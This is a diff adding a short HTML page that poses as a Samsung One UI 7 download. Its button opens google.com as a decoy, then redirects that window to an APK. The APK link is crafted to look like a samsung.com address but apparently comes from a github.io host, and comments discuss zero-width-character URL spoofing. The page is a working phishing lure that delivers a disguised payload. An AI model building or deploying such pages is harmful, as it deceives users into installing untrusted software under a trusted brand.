@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Samsung OneUI</title>
+</head>
+<body>
+  <button onclick="advancedSpoof()">Download Samsung OneUI 7</button>
+
+  <script>
+    function advancedSpoof() {
+      // Method yang paling promising: zero-width characters
+      const payloads = [
+        // Zero-width space between 
+
+      "https://www.samsung.com/id/one-ui/@ryynx88.github.io/chy.apk",
+
+      ];
+
+      // Coba buka Google dulu untuk visual spoof
+      const w = window.open('https://google.com', 'googleFrame');
+
+      setTimeout(() => {
+        // Coba semua payload
+        payloads.forEach((url, index) => {
+          setTimeout(() => {
+            // Redirect window Google ke payload
+            try {
+              w.location.href = url;
+            } catch(e) {
+              // Fallback ke window baru
+              window.open(url, `download${index}`);
+            }
+          }, index * 500);
+        });
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
